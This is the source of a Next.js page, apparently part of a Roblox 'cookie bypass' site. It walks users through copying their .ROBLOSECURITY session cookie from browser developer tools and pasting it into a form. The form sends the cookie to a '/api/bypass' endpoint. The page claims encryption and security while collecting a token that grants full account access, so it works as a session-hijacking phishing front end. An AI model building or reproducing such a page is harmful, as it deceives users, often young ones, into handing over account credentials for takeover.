'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { ArrowLeft, Loader2, CheckCircle, AlertCircle, Copy } from 'lucide-react';

export default function SubmitPage() {
  const [cookie, setCookie] = useState('');
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState('');
  const [csrfToken, setCsrfToken] = useState('');
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    const fetchCsrfToken = async () => {
      try {
        const res = await fetch('/api/csrf-token');
        const data = await res.json();
        setCsrfToken(data.csrfToken);
      } catch (err) {
        console.error('Failed to fetch CSRF token:', err);
      }
    };

    fetchCsrfToken();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cookie.trim()) {
      setError('Please enter a valid cookie');
      return;
    }

    setLoading(true);
    setError('');
    setSuccess(false);

    try {
      const res = await fetch('/api/bypass', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-csrf-token': csrfToken,
        },
        body: JSON.stringify({ cookie: cookie.trim() }),
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.message || 'Failed to process cookie');
      }

      setSuccess(true);
      setCookie('');
      setTimeout(() => {
        window.location.href = '/dashboard';
      }, 2000);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'An error occurred');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Navigation */}
      <nav className="fixed top-0 w-full z-50 glass-effect border-b backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex justify-between items-center">
          <Link href="/" className="text-xl font-bold gradient-text">
            ImHellAMo
          </Link>
          <Link href="/" className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors btn-icon">
            <ArrowLeft className="w-4 h-4" />
            Back
          </Link>
        </div>
      </nav>

      {/* Main Content */}
      <div className="pt-32 pb-20 px-4 min-h-screen flex items-center justify-center">
        <div className="w-full max-w-2xl">
          <div className="mb-8 text-center">
            <h1 className="text-4xl md:text-5xl font-bold mb-3">Submit Cookie</h1>
            <p className="text-muted-foreground text-lg">Process and validate your Roblox security cookie securely</p>
          </div>

          <div className="grid md:grid-cols-2 gap-8">
            {/* Form Section */}
            <div className="space-y-6">
              <form onSubmit={handleSubmit} className="glass-effect rounded-xl p-8 space-y-6">
                <div>
                  <label className="block text-sm font-semibold mb-3">
                    ROBLOSECURITY Cookie
                  </label>
                  <textarea
                    value={cookie}
                    onChange={(e) => setCookie(e.target.value)}
                    placeholder="Paste your .ROBLOSECURITY cookie here..."
                    className="input-base h-40 resize-none"
                    disabled={loading}
                  />
                  <p className="text-xs text-muted-foreground mt-2">Keep this secure and confidential</p>
                </div>

                {error && (
                  <div className="flex gap-3 p-4 rounded-lg" style={{backgroundColor: 'rgba(239, 68, 68, 0.1)', borderColor: 'rgba(239, 68, 68, 0.5)'}}>
                    <AlertCircle className="w-5 h-5 text-error flex-shrink-0 mt-0.5" />
                    <div className="text-error text-sm">{error}</div>
                  </div>
                )}

                {success && (
                  <div className="flex gap-3 p-4 rounded-lg" style={{backgroundColor: 'rgba(16, 185, 129, 0.1)', borderColor: 'rgba(16, 185, 129, 0.5)'}}>
                    <CheckCircle className="w-5 h-5 text-success flex-shrink-0 mt-0.5" />
                    <div className="text-success text-sm">Cookie processed successfully! Redirecting...</div>
                  </div>
                )}

                <button
                  type="submit"
                  disabled={loading || !cookie.trim() || !csrfToken}
                  className="w-full btn-primary py-3 font-semibold flex items-center justify-center gap-2"
                >
                  {loading ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    'Submit Cookie'
                  )}
                </button>

                <div className="text-xs text-muted-foreground text-center">
                  Your cookie is encrypted and transmitted securely with CSRF protection
                </div>
              </form>
            </div>

            {/* Info Section */}
            <div className="space-y-6">
              <div className="card-base rounded-xl">
                <h3 className="font-semibold mb-4 text-lg">How to find your cookie:</h3>
                <ol className="text-sm text-muted-foreground space-y-3">
                  {[
                    "Open Roblox.com in your browser",
                    "Press F12 to open Developer Tools",
                    "Go to Application → Cookies → roblox.com",
                    "Find and copy the ROBLOSECURITY value",
                    "Paste it in the form and submit"
                  ].map((step, i) => (
                    <li key={i} className="flex gap-3">
                      <span className="text-primary font-semibold flex-shrink-0">{i + 1}.</span>
                      <span>{step}</span>
                    </li>
                  ))}
                </ol>
              </div>

              <div className="card-base rounded-xl" style={{borderColor: 'rgba(245, 158, 11, 0.5)', backgroundColor: 'rgba(245, 158, 11, 0.05)'}}>
                <h4 className="font-semibold text-warning mb-2">Security Notice</h4>
                <p className="text-sm text-muted-foreground">
                  Never share your ROBLOSECURITY cookie with untrusted sources. This cookie grants full access to your Roblox account.
                </p>
              </div>

              <div className="card-base rounded-xl">
                <h4 className="font-semibold mb-3">Key Features</h4>
                <ul className="text-sm text-muted-foreground space-y-2">
                  <li className="flex gap-2">
                    <span className="text-primary">✓</span>
                    <span>End-to-end encryption</span>
                  </li>
                  <li className="flex gap-2">
                    <span className="text-primary">✓</span>
                    <span>CSRF protection</span>
                  </li>
                  <li className="flex gap-2">
                    <span className="text-primary">✓</span>
                    <span>Processing in &lt;1 second</span>
                  </li>
                  <li className="flex gap-2">
                    <span className="text-primary">✓</span>
                    <span>Secure request history</span>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
